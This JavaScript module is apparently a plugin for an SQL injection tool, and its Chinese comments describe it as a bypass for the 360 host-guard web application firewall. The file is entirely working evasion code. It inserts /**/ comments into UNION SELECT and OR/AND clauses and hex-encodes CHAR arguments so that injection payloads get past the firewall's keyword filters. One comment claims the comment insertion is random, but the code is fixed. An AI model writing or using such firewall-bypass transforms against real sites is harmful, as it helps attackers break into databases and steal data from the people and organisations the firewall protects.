// 360waf.js — 针对 360 主机卫士/WAF 的绕过插件
// 策略：UNION/**/SELECT 绕过关键字过滤 + 注释随机插入 + CHAR 十六进制编码
export const _360waf = {
  name: '_360waf',
  description: '针对 360 主机卫士/WAF：UNION/**/SELECT + 关键字间注释随机插入 + CHAR 十六进制',
  transform(payload, ctx) {
    let s = String(payload ?? '');
    // 1) UNION SELECT → UNION/**/SELECT
    s = s.replace(/union\s+select/gi, (m) => {
      const first = m[0];
      return first === 'U' || first === 'u' ? 'UNION/**/SELECT' : 'union/**/select';
    });
    // 2) UNION ALL SELECT → UNION/**/ALL/**/SELECT
    s = s.replace(/union\s+all\s+select/gi, (m) => {
      return 'UNION/**/ALL/**/SELECT';
    });
    // 3) 关键字间插入 /**/ 随机变体
    s = s.replace(/or\s+(\d+)/gi, 'OR/**/$1');
    s = s.replace(/and\s+(\d+)/gi, 'AND/**/$1');
    // 4) CHAR(n) → CHAR(0x6e) 十六进制编码
    s = s.replace(/CHAR\s*\(\s*(\d+)\s*\)/gi, (_, n) => `CHAR(0x${Number(n).toString(16)})`);
    return s;
  },
};